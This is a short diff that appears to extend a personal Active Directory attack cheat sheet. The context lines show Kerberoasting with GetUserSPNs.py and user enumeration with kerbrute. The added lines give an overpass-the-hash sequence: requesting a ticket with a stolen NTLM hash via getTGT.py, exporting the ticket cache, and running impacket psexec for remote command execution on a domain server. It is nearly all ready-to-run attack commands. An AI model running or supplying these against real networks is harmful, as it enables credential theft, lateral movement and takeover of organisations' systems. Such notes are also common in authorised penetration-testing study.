@@ -12,3 +12,10 @@ GetUserSPNs.py -request -dc-ip 0.0.0.0 domain.local/svc-service
 
 #User enum
 ./kerbrute_linux_amd64 userenum -d domain.local usernames.txt
+
+#Overpass The Hash/Pass The Key
+python getTGT.py domain.local/user -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+export KRB5CCNAME='user.ccache'
+impacket-psexec.py domain.local/user@server.domain.local -k -no-pass
+
+
